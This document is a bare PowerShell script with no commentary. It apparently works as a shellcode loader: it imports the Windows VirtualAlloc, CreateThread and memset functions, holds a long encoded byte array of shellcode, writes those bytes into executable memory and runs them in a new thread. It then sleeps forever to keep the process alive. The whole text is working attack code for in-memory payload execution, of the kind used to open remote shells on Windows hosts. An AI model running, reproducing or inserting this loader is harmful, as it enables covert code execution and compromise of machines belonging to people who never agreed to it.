$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd1,0xba,0xb2,0x90,0x1d,0xba,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x31,0x53,0x18,0x83,0xc3,0x04,0x03,0x53,0xa6,0x72,0xe8,0x46,0x2e,0xf0,0x13,0xb7,0xae,0x95,0x9a,0x52,0x9f,0x95,0xf9,0x17,0x8f,0x25,0x89,0x7a,0x23,0xcd,0xdf,0x6e,0xb0,0xa3,0xf7,0x81,0x71,0x09,0x2e,0xaf,0x82,0x22,0x12,0xae,0x00,0x39,0x47,0x10,0x39,0xf2,0x9a,0x51,0x7e,0xef,0x57,0x03,0xd7,0x7b,0xc5,0xb4,0x5c,0x31,0xd6,0x3f,0x2e,0xd7,0x5e,0xa3,0xe6,0xd6,0x4f,0x72,0x7d,0x81,0x4f,0x74,0x52,0xb9,0xd9,0x6e,0xb7,0x84,0x90,0x05,0x03,0x72,0x23,0xcc,0x5a,0x7b,0x88,0x31,0x53,0x8e,0xd0,0x76,0x53,0x71,0xa7,0x8e,0xa0,0x0c,0xb0,0x54,0xdb,0xca,0x35,0x4f,0x7b,0x98,0xee,0xab,0x7a,0x4d,0x68,0x3f,0x70,0x3a,0xfe,0x67,0x94,0xbd,0xd3,0x13,0xa0,0x36,0xd2,0xf3,0x21,0x0c,0xf1,0xd7,0x6a,0xd6,0x98,0x4e,0xd6,0xb9,0xa5,0x91,0xb9,0x66,0x00,0xd9,0x57,0x72,0x39,0x80,0x3f,0xb7,0x70,0x3b,0xbf,0xdf,0x03,0x48,0x8d,0x40,0xb8,0xc6,0xbd,0x09,0x66,0x10,0xc2,0x23,0xde,0x8e,0x3d,0xcc,0x1f,0x86,0xf9,0x98,0x4f,0xb0,0x28,0xa1,0x1b,0x40,0xd5,0x74,0xb1,0x45,0x41,0x7d,0x46,0x46,0x88,0xe9,0x44,0x46,0xbb,0xb5,0xc1,0xa0,0xeb,0x15,0x82,0x7c,0x4b,0xc6,0x62,0x2d,0x23,0x0c,0x6d,0x12,0x53,0x2f,0xa7,0x3b,0xf9,0xc0,0x1e,0x13,0x95,0x79,0x3b,0xef,0x04,0x85,0x91,0x95,0x06,0x0d,0x16,0x69,0xc8,0xe6,0x53,0x79,0xbc,0x06,0x2e,0x23,0x6a,0x18,0x84,0x4e,0x92,0x8c,0x23,0xd9,0xc5,0x38,0x2e,0x3c,0x21,0xe7,0xd1,0x6b,0x3a,0x2e,0x44,0xd4,0x54,0x4f,0x88,0xd4,0xa4,0x19,0xc2,0xd4,0xcc,0xfd,0xb6,0x86,0xe9,0x01,0x63,0xbb,0xa2,0x97,0x8c,0xea,0x17,0x3f,0xe5,0x10,0x4e,0x77,0xaa,0xeb,0xa5,0x89,0x96,0x3d,0x83,0xff,0xf6,0xfd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};